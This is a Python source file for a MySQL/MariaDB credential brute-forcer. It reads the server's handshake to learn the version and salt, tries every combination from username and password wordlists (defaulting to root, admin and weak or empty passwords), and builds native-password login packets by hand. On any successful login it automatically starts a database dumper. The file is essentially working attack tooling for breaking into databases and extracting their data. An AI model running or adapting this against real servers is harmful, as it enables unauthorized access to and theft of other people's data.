"""MySQL extractor — fingerprints MySQL/MariaDB version and tests credentials from wordlists."""

import hashlib
import itertools
import os
import socket
import struct
from unittest import result

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Fallback credentials if wordlists are not found
FALLBACK_USERNAMES = ['root', 'admin', 'mysql', 'test', 'cpanel']
FALLBACK_PASSWORDS = ['', 'root', 'admin', 'password', 'mysql', '123456']


class MySQLExtractor:
    """Fingerprints MySQL/MariaDB version and attempts login with credentials from wordlists."""

    def __init__(self, ip: str, port: int = 3306):
        """Initialize with target IP and port.

        Args:
            ip (str): Target IP address.
            port (int): MySQL port, default 3306.
        """
        self.ip = ip
        self.port = port

    def run(self):
        """Attempt TCP connection, read banner, then test credentials from wordlists.

        Returns:
            dict: Version, credential test results, and any successful logins.
        """
        print(f"  [MySQL] Connecting to {self.ip}:{self.port}")
        result = {'status': 'open', 'version': 'unknown', 'credentials': []}

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.ip, self.port))
            banner = sock.recv(1024)
            sock.close()

            version, salt = self._parse_banner(banner)
            result['version'] = version
            print(f"  [MySQL] Version: {version}")
            if not salt:
                print(f"  [MySQL] No salt from handshake — skipping brute force")
                return result

        except Exception as e:
            print(f"  [MySQL] Banner failed: {e}")
            result['status'] = 'failed'
            return result

        credentials = self._load_credentials()
        print(f"  [MySQL] Testing {len(credentials)} combinations...")

        for username, password in credentials:
            cred_result = self._test_credential(username, password, salt)
            display = f"{username}:{password if password else '(empty)'}"
            if cred_result == 'success':
                print(f"  [MySQL] *** VALID CREDENTIAL FOUND: {display} ***")
                result['credentials'].append({'user': username, 'password': password, 'status': 'valid'})
                from src.utils.extractors.mysql_dump import MySQLDumper
                dumper = MySQLDumper(self.ip, self.port, username, password)
                dumper.run()
            elif cred_result == 'wrong_password':
                print(f"  [MySQL] Invalid: {display}")
            else:
                print(f"  [MySQL] Error testing {display}: {cred_result}")

        return result

    def _load_credentials(self) -> list:
        """Load usernames and passwords from wordlist files and return all combinations.

        Looks for any .txt file in the wordlists/ directory.
        Expects at least one file with 'user' in the name and one with 'pass' in the name.
        Falls back to built-in defaults if files are not found.

        Returns:
            list: List of (username, password) tuples.
        """
        wordlists_path = os.path.join(BASE_DIR, '..', '..', '..', 'wordlists')
        usernames = self._load_wordlist(wordlists_path, 'user', FALLBACK_USERNAMES)
        passwords = self._load_wordlist(wordlists_path, 'pass', FALLBACK_PASSWORDS)
        return list(itertools.product(usernames, passwords))

    def _load_wordlist(self, directory: str, keyword: str, fallback: list) -> list:
        """Find and load a wordlist file whose name contains the given keyword.

        Args:
            directory (str): Path to wordlists directory.
            keyword (str): Keyword to match in filename (e.g. 'user', 'pass').
            fallback (list): Default list to use if no matching file is found.

        Returns:
            list: Lines from the matched file, or fallback list.
        """
        try:
            for filename in os.listdir(directory):
                if keyword.lower() in filename.lower() and filename.endswith('.txt'):
                    filepath = os.path.join(directory, filename)
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = [line.strip() for line in f if line.strip()]
                    print(f"  [MySQL] Loaded {len(lines)} entries from {filename}")
                    return lines
        except FileNotFoundError:
            pass
        print(f"  [MySQL] No wordlist found for '{keyword}' — using fallback ({len(fallback)} entries)")
        return fallback

    def _parse_banner(self, banner: bytes):
        """Extract version string and auth salt from MySQL/MariaDB handshake packet.

        Args:
            banner (bytes): Raw bytes from server greeting.

        Returns:
            tuple: (version_string, salt_bytes)
        """
        try:
            payload = banner[4:]
            if payload[0] != 10:
                return 'unknown', b''

            version_end = payload.index(b'\x00', 1)
            version = payload[1:version_end].decode('utf-8', errors='ignore')
            display_version = version.replace('5.5.5-', '')

            offset = version_end + 1 + 4
            salt1 = payload[offset:offset + 8]

            offset2 = offset + 8 + 1 + 2 + 1 + 2 + 2 + 1 + 10
            salt2 = payload[offset2:offset2 + 12]

            salt = salt1 + salt2
            return display_version, salt if len(salt) >= 16 else b''
        except Exception:
            pass
        return 'unknown', b''

    def _test_credential(self, username: str, password: str, salt: bytes) -> str:
        """Attempt MySQL authentication with given credentials using native password hashing.

        Args:
            username (str): MySQL username to test.
            password (str): Password to test.
            salt (bytes): Auth salt from initial server handshake.

        Returns:
            str: 'success', 'wrong_password', or error message string.
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.ip, self.port))
            sock.recv(1024)  # consume handshake — use passed-in salt instead
            auth_response = self._mysql_native_password(password, salt) if password else b''
            username_bytes = username.encode() + b'\x00'
            auth_data = bytes([len(auth_response)]) + auth_response if password else b'\x00'
            capabilities = 0x0200 | 0x8000 | 0x0004
            payload = (
                struct.pack('<I', capabilities)[:3] +
                b'\x00' +
                struct.pack('<I', 16777216)[:3] +
                b'\x00' +
                b'\x00' * 23 +
                username_bytes +
                auth_data
            )
            packet = struct.pack('<I', len(payload))[:3] + b'\x01' + payload
            sock.send(packet)
            response = sock.recv(1024)
            sock.close()
            if not response or len(response) < 5:
                return 'empty_response'
            marker = response[4]
            if marker == 0x00:
                return 'success'
            elif marker == 0xFF:
                return 'wrong_password'
            elif marker == 0xFE:
                return 'auth_switch_required'
            else:
                return f'unknown_marker:{hex(marker)}'
        except Exception as e:
            return str(e)

    def _mysql_native_password(self, password: str, salt: bytes) -> bytes:
        """Compute MySQL native password hash: XOR(SHA1(password), SHA1(salt + SHA1(SHA1(password)))).

        Args:
            password (str): Plaintext password.
            salt (bytes): Auth salt from server handshake.

        Returns:
            bytes: 20-byte auth response.
        """
        pwd = password.encode('utf-8')
        hash1 = hashlib.sha1(pwd).digest()
        hash2 = hashlib.sha1(hash1).digest()
        hash3 = hashlib.sha1(salt + hash2).digest()
        return bytes(a ^ b for a, b in zip(hash1, hash3))